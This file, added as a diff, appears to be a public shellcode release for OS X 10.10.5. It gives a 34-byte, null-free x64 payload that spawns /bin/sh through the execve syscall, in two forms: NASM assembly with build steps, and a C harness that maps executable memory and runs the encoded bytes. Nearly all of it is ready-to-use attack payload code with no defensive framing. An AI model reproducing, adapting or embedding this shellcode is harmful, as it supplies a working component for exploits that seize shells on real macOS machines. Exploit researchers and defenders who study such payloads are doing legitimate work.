@@ -1,0 +1,66 @@
+[*] Author: Csaba Fitzl, @theevilbit
+[*] Tested on OS X 10.10.5
+[*] OS X x64 /bin/sh shellcode, NULL byte free, 34 bytes
+[*] Assembly version
+[*] binsh-shellcode.asm
+[*] ./nasm -f macho64 binsh-shellcode.asm
+[*] ld -macosx_version_min 10.7.0 -o binsh-shellcode binsh-shellcode.o 
+
+-------------------------------------------------------------------------------
+BITS 64
+
+global start
+
+section .text
+
+start:
+	xor     rsi,rsi					;zero out RSI
+	push    rsi						;push NULL on stack
+	mov     rdi, 0x68732f6e69622f2f	;mov //bin/sh string to RDI (reverse)
+	push    rdi						;push rdi to the stack
+	mov     rdi, rsp				;store RSP (points to the command string) in RDI
+	xor     rdx, rdx				;zero out RDX
+	
+	;store syscall number on RAX
+	xor     rax,rax					;zero out RAX
+	mov     al,2					;put 2 to AL -> RAX = 0x0000000000000002
+	ror     rax, 0x28				;rotate the 2 -> RAX = 0x0000000002000000
+	mov     al,0x3b					;move 3b to AL (execve SYSCALL#) -> RAX = 0x000000000200003b
+    syscall							;trigger syscall
+-------------------------------------------------------------------------------
+
+[*] C version
+[*] Get the hex opcodes from the object file: otool -t binsh-shellcode.o
+[*] binsh-shellcode.c
+[*] Compile: gcc binsh-shellcode.c -o sc
+[*] Run: ./sc
+
+-------------------------------------------------------------------------------
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+ 
+int (*sc)();
+ 
+char shellcode[] =
+"\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
+ 
+int main(int argc, char **argv) {
+ 
+    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
+            | MAP_PRIVATE, -1, 0);
+ 
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+ 
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    sc = ptr;
+ 
+    sc();
+ 
+    return 0;
+}
+-------------------------------------------------------------------------------
